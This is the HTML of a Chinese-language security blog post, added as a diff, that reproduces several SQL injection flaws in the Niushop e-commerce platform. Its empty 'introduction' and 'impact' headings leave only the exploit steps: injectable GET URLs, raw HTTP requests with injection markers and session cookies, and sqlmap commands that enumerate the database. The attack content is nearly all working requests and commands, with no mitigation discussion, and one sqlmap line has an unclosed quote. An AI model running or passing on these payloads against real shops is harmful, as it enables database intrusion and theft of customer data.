@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Niushop sql注入一、漏洞简介二、漏洞影响三、复现过程sql注入（一）order参数：http:&#x2F;&#x2F;0-sec.org&#x2F;index.php&#x2F;wap&#x2F;goods&#x2F;getGoodsListByConditions?category_id&#x3D;1&amp;brand_id&#x3D;2&amp;min_price&#x3D;3&amp;max_price&#x3D;4&amp;page&#x3D;5&amp;page_size&#x3D;6&amp;amp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Niushop/Niushop%20sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Niushop sql注入一、漏洞简介二、漏洞影响三、复现过程sql注入（一）order参数：http:&#x2F;&#x2F;0-sec.org&#x2F;index.php&#x2F;wap&#x2F;goods&#x2F;getGoodsListByConditions?category_id&#x3D;1&amp;brand_id&#x3D;2&amp;min_price&#x3D;3&amp;max_price&#x3D;4&amp;page&#x3D;5&amp;page_size&#x3D;6&amp;amp">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:00.368Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Niushop/Niushop sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Niushop/Niushop%20sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.368Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Niushop-sql注入"><a href="#Niushop-sql注入" class="headerlink" title="Niushop sql注入"></a>Niushop sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="sql注入（一）"><a href="#sql注入（一）" class="headerlink" title="sql注入（一）"></a>sql注入（一）</h3><h4 id="order参数："><a href="#order参数：" class="headerlink" title="order参数："></a>order参数：</h4><pre><code>http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&amp;brand_id=2&amp;min_price=3&amp;max_price=4&amp;page=5&amp;page_size=6&amp;order=7%27&amp;attr_array[][2]=8&amp;spec_array[]=9
+</code></pre>
+<h4 id="attr-array参数："><a href="#attr-array参数：" class="headerlink" title="attr_array参数："></a>attr_array参数：</h4><pre><code>http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&amp;brand_id=2&amp;min_price=3&amp;max_price=4&amp;page=5&amp;page_size=6&amp;order=7&amp;attr_array[][2]=8%27&amp;spec_array[]=9
+</code></pre>
+<h4 id="直接上sqlmap"><a href="#直接上sqlmap" class="headerlink" title="直接上sqlmap"></a>直接上sqlmap</h4><pre><code>sqlmap -u &quot;http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&amp;brand_id=2&amp;min_price=3&amp;max_price=4&amp;page=5&amp;page_size=6&amp;order=7&amp;attr_array[][2]=8*&amp;spec_array[]=9&quot; --random-agent --batch --dbms &quot;mysql&quot;
+sqlmap -u &quot;http://0-sec.org/index.php/wap/goods/getGoodsListByConditions?category_id=1&amp;brand_id=2&amp;min_price=3&amp;max_price=4&amp;page=5&amp;page_size=6&amp;order=7&amp;attr_array[][2]=8*&amp;spec_array[]=9&quot; --random-agent --batch --dbms &quot;mysql&quot; --current-db
+</code></pre>
+<h3 id="sql注入（二）"><a href="#sql注入（二）" class="headerlink" title="sql注入（二）"></a>sql注入（二）</h3><pre><code>GET /index.php?s=/wap/Goods/promotionZone&amp;group_id=*&amp;page=1 HTTP/1.1
+Host: 0-sec.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://172.16.209.129:8085/index.php/wap/goods/promotionZone
+X-Requested-With: XMLHttpRequest
+Cookie: PHPSESSID=uolpfnofnhcmdnamo55d883bk4; admin_type=1; workspaceParamSupplier=index%7CGoods; CNZZDATA009=30037667-1536735
+Connection: close
+</code></pre>
+<p>将数据包保存为niushop.txt</p>
+<pre><code>sqlmap -r niushop.txt  --random-agent --batch --dbms &quot;mysql&quot;
+</code></pre>
+<h3 id="sql注入（三）"><a href="#sql注入（三）" class="headerlink" title="sql注入（三）"></a>sql注入（三）</h3><pre><code>POST /index.php?s=/wap/Goods/goodsSearchList HTTP/1.1
+Host: 0-sec.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://172.16.209.129:8086/index.php/wap/goods/goodsSearchList
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 66
+Cookie: PHPSESSID=uolpfnofnhcmdnamo55d883bk4; admin_type=1; workspaceParamSupplier=index%7CGoods; CNZZDATA009=30037667-1536735
+Connection: close
+Cache-Control: max-age=0
+
+sear_name=&amp;sear_type=1&amp;order=*&amp;sort=asc&amp;controlType=&amp;shop_id=0&amp;page=1
+</code></pre>
+<p>数据包保存为niushop.txt</p>
+<pre><code>sqlmap -r niushop.txt  --random-agent --batch --dbms &quot;mysql
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Niushop/Niushop%20sql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qt0b00cdy8v13vzf9e53" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Niushop/Niushop%20%E5%8D%95%E5%95%86%E6%88%B7%202.2%20%E5%89%8D%E5%8F%B0getshell/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Nginx/%EF%BC%88CVE-2020-12440%EF%BC%89Nginx%20_=%201.8.0%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
